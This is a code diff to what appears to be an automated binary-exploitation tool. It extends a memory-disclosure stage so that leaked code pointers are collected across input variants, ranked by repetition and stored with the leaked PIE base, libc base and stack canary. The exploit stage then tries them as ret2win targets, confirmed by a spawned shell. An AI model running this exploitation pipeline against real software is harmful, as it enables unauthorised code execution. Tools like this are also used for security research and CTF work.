@@ -565,6 +565,10 @@ def _address_disclosure(ctx, target, mode, base_argv, orig, prim, timeout):
                     _seen_vars.add(var)
                     candidates.append((None, var))
         best = None
+        from collections import Counter as _Counter
+        _code_counts: _Counter = _Counter()
+        _exec_ranges = _leak.executable_vaddr_ranges(target_bytes)
+        _word = 8 if (target.bits or 64) >= 64 else 4
         for v, var in candidates:
             _rep, out = _detonate_capturing(ctx, target, plain, mode, base_argv, bytes(var),
                                             timeout, aslr=True)
@@ -578,11 +582,19 @@ def _address_disclosure(ctx, target, mode, base_argv, orig, prim, timeout):
             # oracle. So the gate is "it survived and printed something" and the resolver judges.
             if not out:
                 continue
+            # Collect in-image code pointers from EVERY surviving variant, weighted by how often
+            # each appears. A win()-like target is leaked by the SMALL-index neighbour read (where
+            # it is stored, often more than once), which is NOT the same variant that proves a
+            # libc base (the far read) -- so we must not stop at the first proved one, or the win
+            # pointer the exploit stage needs would never be collected. See `_disclosed_code_ptrs`.
+            for cp in _leak.disclosed_code_pointers(out, _exec_ranges, word=_word, limit=32):
+                _code_counts[cp] += out.count(cp.to_bytes(_word, "little"))
             cand = _leak.disclosed_bases(out, target_bytes, _host_libc_bytes(),
                                          baseline=base_out)
             if cand.get("proved"):
-                best = (bytes(var), out, cand)
-                break
+                if best is None:
+                    best = (bytes(var), out, cand)        # first proved base wins the disclosure,
+                continue                                  # but keep scanning for code pointers
             if best is None or int(cand.get("distinct") or 0) > int(best[2].get("distinct") or 0):
                 best = (bytes(var), out, cand)
         if best is None:
@@ -600,6 +612,14 @@ def _address_disclosure(ctx, target, mode, base_argv, orig, prim, timeout):
                          + "), so the bytes it reads were not observed leaving the process")})
             return None
         d = best[2]
+        # Leaked CODE pointers, for a ret2win target the disassembler cannot see. A stripped
+        # binary whose win()-like function is reached only through a stored pointer (a callback, a
+        # vtable slot) is never analysed -- no call references it -- so `find_win` is blind to it,
+        # but the read just disclosed its runtime address. Record the pointers that land in the
+        # target's own executable segment, most-repeated first (a deliberately-stored callback is
+        # leaked more than once); the exploit stage tries each as a ret2win target, confirmed by a
+        # spawned shell, so a non-win pointer is rejected rather than faked.
+        d["code_ptrs"] = [cp for cp, _ in _code_counts.most_common(8)]
     except Exception:                                     # noqa: BLE001 -- best-effort experiment
         observe.absorbed(_log, "answering None")
         return None
@@ -611,6 +631,7 @@ def _address_disclosure(ctx, target, mode, base_argv, orig, prim, timeout):
         "proved": d["proved"], "rule": d["rule"], "distinct_pointers": d["distinct"],
         "pie_base": d["pie_base"], "libc_base": d["libc_base"], "canary": d["canary"],
         "disclosed_bytes": d["disclosed_bytes"], "note": d["note"],
+        "code_ptrs": d.get("code_ptrs") or [],
         "steered_byte": off, "steered_to": (best[0][off] if off is not None else None),
         "steered_input": best[0][:32].decode("latin-1"),
         "input_sha": d["input_sha"]})
@@ -1174,7 +1195,7 @@ def primitive_stage(ctx) -> dict:
                 if _disc:
                     _av["disclosure"] = {k: _disc[k] for k in
                                          ("proved", "rule", "pie_base", "libc_base", "canary",
-                                          "distinct", "disclosed_bytes", "note", "input_sha")
+                                           "distinct", "disclosed_bytes", "note", "input_sha", "code_ptrs")
                                          if k in _disc}
                 return _finalize(ctx, target, target_bytes, _dmode, base_argv, _dcap, _demo,
                                  _av, True, {"input_modes_tried": tried})
@@ -1399,7 +1420,7 @@ def primitive_stage(ctx) -> dict:
                 if _disc:
                     _av["disclosure"] = {k: _disc[k] for k in
                                          ("proved", "rule", "pie_base", "libc_base", "canary",
-                                          "distinct", "disclosed_bytes", "note", "input_sha")
+                                           "distinct", "disclosed_bytes", "note", "input_sha", "code_ptrs")
                                          if k in _disc}
                 return _finalize(ctx, target, target_bytes, _dmode, base_argv, _dcap, _demo,
                                  _av, True, {"after": "no register control"})
